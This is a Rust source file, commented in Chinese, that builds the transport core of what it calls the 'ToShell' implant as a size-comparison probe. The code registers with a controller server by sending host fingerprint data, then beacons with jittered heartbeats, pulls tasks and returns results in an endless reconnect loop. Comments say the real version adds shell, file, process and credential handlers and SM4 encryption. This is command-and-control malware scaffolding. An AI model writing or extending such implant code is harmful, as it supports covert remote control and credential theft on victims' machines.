// Tier 2: 传输核心 —— 只用 std，模拟 ToShell 植入端的最小子集：
//   TCP 连接 + 变长帧编解码 + 注册/心跳/任务取回 + 结果回写 + 睡眠节拍。
// 目的是量出"协议栈 + 网络 + 线程"这一层在 Rust 下的体积代价，
// 与 Go 的 light/tcp 载荷（本机实测 2,946,805 B）做同口径对比。
//
// 说明：本文件是可行性探针，不实现加密（真实实现用纯 Rust SM4，体积另行计入），
// 也不实现劫持/注入/凭据等高价值能力（它们在 Windows 侧，见可行性文档的成本分解）。

use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

const DFLT_SERVER: &str = "127.0.0.1:18777";

// ---------- 帧编解码：4 字节小端长度前缀 + 载荷 ----------
fn write_frame(s: &mut TcpStream, payload: &[u8]) -> io::Result<()> {
    let mut hdr = [0u8; 4];
    hdr.copy_from_slice(&(payload.len() as u32).to_le_bytes());
    s.write_all(&hdr)?;
    s.write_all(payload)?;
    s.flush()
}

fn read_frame(s: &mut TcpStream, cap: usize) -> io::Result<Vec<u8>> {
    let mut hdr = [0u8; 4];
    s.read_exact(&mut hdr)?;
    let n = u32::from_le_bytes(hdr) as usize;
    if n > cap {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "frame too large"));
    }
    let mut buf = vec![0u8; n];
    s.read_exact(&mut buf)?;
    Ok(buf)
}

// ---------- 极简 TLV：type(1) + len(2) + value ----------
fn tlv(out: &mut Vec<u8>, t: u8, v: &[u8]) {
    out.push(t);
    out.extend_from_slice(&(v.len() as u16).to_le_bytes());
    out.extend_from_slice(v);
}

fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn hostname() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".to_string())
}

fn build_register(session: u64) -> Vec<u8> {
    let mut p = Vec::with_capacity(256);
    tlv(&mut p, 0x01, &session.to_le_bytes());
    tlv(&mut p, 0x02, hostname().as_bytes());
    tlv(&mut p, 0x03, std::env::consts::OS.as_bytes());
    tlv(&mut p, 0x04, std::env::consts::ARCH.as_bytes());
    tlv(&mut p, 0x05, &std::process::id().to_le_bytes());
    tlv(&mut p, 0x06, b"light");
    p
}

fn build_heartbeat(session: u64) -> Vec<u8> {
    let mut p = Vec::with_capacity(32);
    tlv(&mut p, 0x11, &session.to_le_bytes());
    tlv(&mut p, 0x12, &now_secs().to_le_bytes());
    p
}

// 任务分发骨架：真实实现里这里挂 shell / 文件 / 进程 / 凭据 等 handle。
fn dispatch(task: &[u8], session: u64) -> Vec<u8> {
    let mut out = Vec::with_capacity(64);
    tlv(&mut out, 0x21, &session.to_le_bytes());
    tlv(&mut out, 0x22, task);
    tlv(&mut out, 0x23, b"ok");
    out
}

fn jitter(base_secs: u64) -> Duration {
    // 与 Go 端一致的抖动口径：base ± 20%
    let span = (base_secs / 5).max(1);
    let seed = now_secs() ^ (std::process::id() as u64);
    Duration::from_secs(base_secs - span + (seed % (span * 2 + 1)))
}

fn main() {
    let server = std::env::args()
        .nth(1)
        .unwrap_or_else(|| DFLT_SERVER.to_string());
    let session = now_secs() ^ ((std::process::id() as u64) << 17);

    loop {
        match TcpStream::connect(&server) {
            Ok(mut s) => {
                let _ = s.set_read_timeout(Some(Duration::from_secs(60)));
                let _ = s.set_write_timeout(Some(Duration::from_secs(30)));
                let _ = s.set_nodelay(true);

                if write_frame(&mut s, &build_register(session)).is_err() {
                    std::thread::sleep(jitter(5));
                    continue;
                }
                // 服务端首包 = 注册回执（这里简化为读一帧丢弃）
                let _ = read_frame(&mut s, 8 * 1024 * 1024);

                loop {
                    // 心跳
                    if write_frame(&mut s, &build_heartbeat(session)).is_err() {
                        break;
                    }
                    match read_frame(&mut s, 8 * 1024 * 1024) {
                        Ok(task) if task.is_empty() => {
                            std::thread::sleep(jitter(3));
                        }
                        Ok(task) => {
                            let res = dispatch(&task, session);
                            if write_frame(&mut s, &res).is_err() {
                                break;
                            }
                        }
                        Err(_) => {
                            std::thread::sleep(jitter(3));
                        }
                    }
                }
            }
            Err(_) => {
                std::thread::sleep(jitter(5));
            }
        }
    }
}
